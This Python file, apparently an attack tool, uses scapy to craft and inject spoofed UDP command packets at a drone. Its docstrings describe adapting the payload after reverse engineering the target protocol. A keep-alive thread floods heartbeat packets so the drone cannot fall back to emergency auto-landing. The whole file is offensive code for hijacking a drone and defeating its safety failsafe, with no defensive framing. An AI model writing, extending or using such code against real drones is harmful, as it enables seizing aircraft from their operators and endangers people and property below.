from scapy.all import send, IP, UDP, Raw
import threading
import time

def craft_command(drone_ip, dport, payload_bytes):
    """
    Build the network stack needed to send a spoofed command.
    Assumes IP/UDP/Raw — customise after reverse engineering the target protocol.
    """
    packet = IP(dst=drone_ip) / UDP(dport=dport) / Raw(load=payload_bytes)
    return packet

def send_command(interface, packet):
    """Inject the crafted packet on the given interface."""
    # verbose=False suppresses scapy's per-frame send log
    send(packet, iface=interface, verbose=False)

class KeepAliveThread(threading.Thread):
    """
    Background thread to periodically send heartbeat/keep-alive packets 
    to prevent the drone from entering emergency auto-landing mode.
    """
    def __init__(self, interface, packet, interval=0.05):
        super().__init__()
        self.interface = interface
        self.packet = packet
        self.interval = interval
        self.daemon = True
        self._stop_event = threading.Event()

    def run(self):
        while not self._stop_event.is_set():
            send(self.packet, iface=self.interface, verbose=False)
            self._stop_event.wait(self.interval)

    def stop(self):
        self._stop_event.set()

